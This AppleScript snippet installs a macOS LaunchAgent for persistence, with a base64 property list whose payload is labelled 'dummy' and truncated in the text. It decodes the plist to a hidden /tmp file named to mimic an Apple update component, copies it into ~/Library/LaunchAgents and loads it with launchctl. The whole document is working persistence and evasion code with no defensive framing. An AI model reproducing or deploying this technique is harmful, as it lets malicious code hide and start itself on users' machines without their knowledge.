-- Base64-encoded LaunchAgent with dummy payload
set plistBase64 to "PD94bWwgdmVyc2lvbj0iMS4wIiBlbm..."

-- Step 1: Decode and write to /tmp
do shell script "echo " & plistBase64 & " | base64 -D > /tmp/.com.apple.upd.plist"

-- Step 2: Copy to LaunchAgents
do shell script "cp /tmp/.com.apple.upd.plist ~/Library/LaunchAgents/.com.apple.upd.plist"

-- Step 3: Load the agent
do shell script "launchctl load ~/Library/LaunchAgents/.com.apple.upd.plist"
